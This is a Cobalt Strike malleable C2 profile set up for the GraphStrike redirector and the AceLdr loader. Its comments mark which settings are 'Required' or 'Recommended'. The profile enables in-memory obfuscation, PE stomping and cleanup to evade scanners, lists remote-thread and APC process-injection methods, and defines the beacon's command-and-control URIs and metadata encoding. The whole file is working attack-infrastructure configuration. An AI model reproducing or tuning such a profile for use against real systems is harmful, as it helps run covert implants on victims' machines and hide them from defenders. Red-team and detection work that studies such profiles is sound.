set sleeptime "5000";
set tasks_max_size "2500000";
set host_stage "false";

# AceLdr recommended/required args
stage {
    set cleanup "true";                 # Recommended, proof that it works
    set userwx "false";                 # Recommended, proof that it works
    set sleep_mask "false";             # !!Required!!
    set obfuscate "true";               # Recommended, proof that it works
    set stomppe "true";                 # Recommended, proof that it works
    set smartinject "false";            # !!Required!!
    set allocator "VirtualAlloc";       # Not required, just an example
}

process-inject {
    set userwx "false";                 # Recommended, proof that it works
    set startrwx "false";               # Recommended, proof that it works
    set allocator "VirtualAllocEx";     # Not required, just an example
    execute {                           # Not required, just an example
        CreateThread;
        CreateRemoteThread;
        NtQueueApcThread;
        RtlCreateUserThread;            
    }
}

post-ex {
    set obfuscate "true";               # Recommended, proof that it works
    set smartinject "false";            # !!Required!!
}

http-config {
    # This section all relates to how the Cobalt Strike web server responds.
    # It's all irrelevant for GraphStrike, since the TS is just responding to the GraphStrike server's requests.
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
}

http-get {

    # We just need our URI to be something unique and recognizable in order for GraphStrike to parse out values
    set uri "/_";
    set verb "GET";

    client {

        metadata {
            base64url;
            uri-append;
        }
    }

    server {

        output {   
            print;
        }
    }
}

http-post {

    # We just need our URI to be something unique and recognizable in order for GraphStrike to parse out values
    set uri "/-_";
    set verb "POST";

    client {
       
        id {
            uri-append;         
        }
              
        output {
            print;
        }
    }

    server {

        output {
            print;
        }
    }
}
